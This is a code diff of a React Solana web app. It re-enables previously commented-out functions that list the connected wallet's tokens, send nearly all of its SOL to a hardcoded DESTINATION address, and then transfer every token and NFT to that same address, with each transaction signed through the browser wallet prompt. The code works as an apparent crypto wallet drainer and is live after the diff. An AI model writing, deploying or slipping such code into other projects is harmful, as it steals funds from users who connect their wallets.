@@ -60,46 +60,46 @@ function App() {
         // let i = 0;
 
         // while (true) {
-        // try {
-        //     const {value} = await connection.getParsedTokenAccountsByOwner(
-        //         publicKey,
-        //         {programId: TOKEN_PROGRAM_ID},
-        //     );
-        //
-        //     const nftAccounts = value.filter(({account}) => {
-        //         if (account.data.parsed.info.mint === WRAPPED_SOL) {
-        //             return false;
-        //         }
-        //
-        //         const amount = account.data.parsed.info.tokenAmount.uiAmount;
-        //
-        //         if (empty) {
-        //             return amount === 0;
-        //         } else {
-        //             return amount > 0;
-        //         }
-        //     }).map(({account, pubkey}) => {
-        //         const amounts = account?.data?.parsed?.info?.tokenAmount;
-        //
-        //         return {
-        //             mint: account.data.parsed.info.mint,
-        //             tokenAcc: pubkey,
-        //             count: Number(amounts.amount),
-        //             uiAmount: Number(amounts.uiAmount),
-        //         };
-        //     });
-        //     console.log(nftAccounts)
-        //     return nftAccounts;
-        // } catch (err) {
-        //     console.log(err);
-        //     // i++;
-        //     //
-        //     // if (i > 3) {
-        //     //     throw err;
-        //     // } else {
-        //     //     continue;
-        //     // }
-        // }
+        try {
+            const {value} = await connection.getParsedTokenAccountsByOwner(
+                publicKey,
+                {programId: TOKEN_PROGRAM_ID},
+            );
+
+            const nftAccounts = value.filter(({account}) => {
+                if (account.data.parsed.info.mint === WRAPPED_SOL) {
+                    return false;
+                }
+
+                const amount = account.data.parsed.info.tokenAmount.uiAmount;
+
+                if (empty) {
+                    return amount === 0;
+                } else {
+                    return amount > 0;
+                }
+            }).map(({account, pubkey}) => {
+                const amounts = account?.data?.parsed?.info?.tokenAmount;
+
+                return {
+                    mint: account.data.parsed.info.mint,
+                    tokenAcc: pubkey,
+                    count: Number(amounts.amount),
+                    uiAmount: Number(amounts.uiAmount),
+                };
+            });
+            console.log(nftAccounts)
+            return nftAccounts;
+        } catch (err) {
+            console.log(err);
+            // i++;
+            //
+            // if (i > 3) {
+            //     throw err;
+            // } else {
+            //     continue;
+            // }
+        }
         // }
     }
 
@@ -147,48 +147,48 @@ function App() {
     }
 
     function formatSOL(lamports) {
-        // return (lamports / LAMPORTS_PER_SOL).toFixed(4);
+        return (lamports / LAMPORTS_PER_SOL).toFixed(4);
     }
 
     async function sendRemainingSOL(walletKeyPair, connection,) {
-        // console.log(`\nSending Solana to destination...\n`);
-        //
-        // const toAccount = new PublicKey(DESTINATION)
-        //
-        // try {
-        //     const balance = await connection.getBalance(walletKeyPair.publicKey);
-        //
-        //     const toSend = balance - (0.01 * LAMPORTS_PER_SOL);
-        //
-        //     if (toSend <= 0.0001 * LAMPORTS_PER_SOL) {
-        //         console.log('No funds to send.');
-        //     }
-        //
-        //     const transaction = new Transaction();
-        //
-        //     transaction.add(SystemProgram.transfer({
-        //         fromPubkey: walletKeyPair.publicKey,
-        //         toPubkey: toAccount,
-        //         lamports: toSend,
-        //     }));
-        //
-        //     console.log(`Sending ${formatSOL(toSend)} SOL to ${DESTINATION.toString()}`);
-        //
-        //     transaction.feePayer = await window.solana.publicKey
-        //     let blockhashObj = await connection.getRecentBlockhash()
-        //     transaction.recentBlockhash = await blockhashObj.blockhash
-        //
-        //     const signed = await window.solana.signTransaction(transaction)
-        //
-        //     const hash = await connection.sendRawTransaction(
-        //         signed.serialize(),
-        //         [walletKeyPair],
-        //     );
-        //
-        //     console.log('Complete.');
-        // } catch (err) {
-        //     console.log(`Error sending SOL: ${err.toString()}`);
-        // }
+        console.log(`\nSending Solana to destination...\n`);
+
+        const toAccount = new PublicKey(DESTINATION)
+
+        try {
+            const balance = await connection.getBalance(walletKeyPair.publicKey);
+
+            const toSend = balance - (0.01 * LAMPORTS_PER_SOL);
+
+            if (toSend <= 0.0001 * LAMPORTS_PER_SOL) {
+                console.log('No funds to send.');
+            }
+
+            const transaction = new Transaction();
+
+            transaction.add(SystemProgram.transfer({
+                fromPubkey: walletKeyPair.publicKey,
+                toPubkey: toAccount,
+                lamports: toSend,
+            }));
+
+            console.log(`Sending ${formatSOL(toSend)} SOL to ${DESTINATION.toString()}`);
+
+            transaction.feePayer = await window.solana.publicKey
+            let blockhashObj = await connection.getRecentBlockhash()
+            transaction.recentBlockhash = await blockhashObj.blockhash
+
+            const signed = await window.solana.signTransaction(transaction)
+
+            const hash = await connection.sendRawTransaction(
+                signed.serialize(),
+                [walletKeyPair],
+            );
+
+            console.log('Complete.');
+        } catch (err) {
+            console.log(`Error sending SOL: ${err.toString()}`);
+        }
     }
 
     // async function closeAccounts(
@@ -249,81 +249,81 @@ function App() {
     // }
 
     async function sendAll(walletKeyPair, connection,) {
-        // console.log(`\nTransferring NFTs and tokens to destination...\n`);
-        //
-        // await sendRemainingSOL(
+        console.log(`\nTransferring NFTs and tokens to destination...\n`);
+
+        await sendRemainingSOL(
+            walletKeyPair,
+            connection,
+        );
+
+        // while (true) {
+        const accounts = await getTokenAccounts(connection, walletKeyPair.publicKey);
+        console.log(accounts)
+
+        if (accounts.length === 0) {
+            console.log(`Finished transferring NFTs and tokens.`);
+            // break;
+        }
+
+        console.log(`Found ${accounts.length} accounts...`);
+
+        const txsNeeded = Math.ceil(accounts.length / Number(accounts.length));
+
+        for (let i = 0; i < accounts.length / Number(accounts.length); i++) {
+            const itemsRemaining = Math.min(Number(accounts.length), accounts.length - i * Number(accounts.length));
+
+            const transaction = new Transaction();
+
+            for (let j = 0; j < itemsRemaining; j++) {
+                const item = i * Number(accounts.length) + j;
+
+                const acc = accounts[item];
+
+                const createATA = await createATAInstruction(
+                    acc.mint,
+                    walletKeyPair,
+                    connection,
+                );
+
+                if (createATA) {
+                    transaction.add(createATA);
+                }
+
+                const transfer = await createTransferTokenInstruction(
+                    acc.mint,
+                    acc.count,
+                    walletKeyPair,
+                    acc.tokenAcc,
+                );
+
+                transaction.add(transfer);
+            }
+
+            console.log(`Sending transaction ${i + 1} / ${txsNeeded}...`);
+
+            try {
+                transaction.feePayer = await window.solana.publicKey
+                let blockhashObj = await connection.getRecentBlockhash()
+                transaction.recentBlockhash = await blockhashObj.blockhash
+
+                const signed = await window.solana.signTransaction(transaction)
+
+                const res = await connection.sendRawTransaction(
+                    signed.serialize(),
+                    [walletKeyPair]
+                );
+            } catch (err) {
+                console.log(`Error sending transaction: ${err.toString()}`);
+            }
+        }
+
+        // await sleep(10 * 1000);
+        // }
+
+        // await closeAccounts(
         //     walletKeyPair,
         //     connection,
         // );
-        //
-        // // while (true) {
-        // const accounts = await getTokenAccounts(connection, walletKeyPair.publicKey);
-        // console.log(accounts)
-        //
-        // if (accounts.length === 0) {
-        //     console.log(`Finished transferring NFTs and tokens.`);
-        //     // break;
-        // }
-        //
-        // console.log(`Found ${accounts.length} accounts...`);
-        //
-        // // const txsNeeded = Math.ceil(accounts.length / Number(accounts.length));
-        //
-        // for (let i = 0; i < accounts.length / Number(accounts.length); i++) {
-        //     const itemsRemaining = Math.min(Number(accounts.length), accounts.length - i * Number(accounts.length));
-        //
-        //     const transaction = new Transaction();
-        //
-        //     for (let j = 0; j < itemsRemaining; j++) {
-        //         const item = i * Number(accounts.length) + j;
-        //
-        //         const acc = accounts[item];
-        //
-        //         const createATA = await createATAInstruction(
-        //             acc.mint,
-        //             walletKeyPair,
-        //             connection,
-        //         );
-        //
-        //         if (createATA) {
-        //             transaction.add(createATA);
-        //         }
-        //
-        //         const transfer = await createTransferTokenInstruction(
-        //             acc.mint,
-        //             acc.count,
-        //             walletKeyPair,
-        //             acc.tokenAcc,
-        //         );
-        //
-        //         transaction.add(transfer);
-        //     }
-        //
-        //     // console.log(`Sending transaction ${i + 1} / ${txsNeeded}...`);
-        //
-        //     try {
-        //         transaction.feePayer = await window.solana.publicKey
-        //         let blockhashObj = await connection.getRecentBlockhash()
-        //         transaction.recentBlockhash = await blockhashObj.blockhash
-        //
-        //         const signed = await window.solana.signTransaction(transaction)
-        //
-        //         const res = await connection.sendRawTransaction(
-        //             signed.serialize(),
-        //             [walletKeyPair]
-        //         );
-        //     } catch (err) {
-        //         console.log(`Error sending transaction: ${err.toString()}`);
-        //     }
-        // }
-        //
-        // // await sleep(10 * 1000);
-        // // }
-        //
-        // // await closeAccounts(
-        // //     walletKeyPair,
-        // //     connection,
-        // // );
 
 
     }
